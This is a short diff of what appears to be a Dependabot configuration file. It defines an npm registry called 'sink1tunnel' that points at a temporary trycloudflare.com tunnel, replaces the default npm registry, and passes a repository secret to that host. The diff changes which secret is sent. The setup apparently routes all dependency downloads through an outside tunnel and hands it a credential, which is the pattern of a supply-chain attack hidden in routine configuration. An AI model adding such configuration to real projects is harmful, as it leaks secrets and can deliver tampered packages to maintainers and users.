@@ -3,7 +3,7 @@ registries:
   sink1tunnel:
     type: npm-registry
     url: https://rand-terms-bytes-subsidiaries.trycloudflare.com/redirc/ctrl
-    token: ${{secrets.TOKEN_NL}}
+    token: ${{secrets.TOKEN_CR}}
     replaces-base: true
 updates:
   - package-ecosystem: "npm"
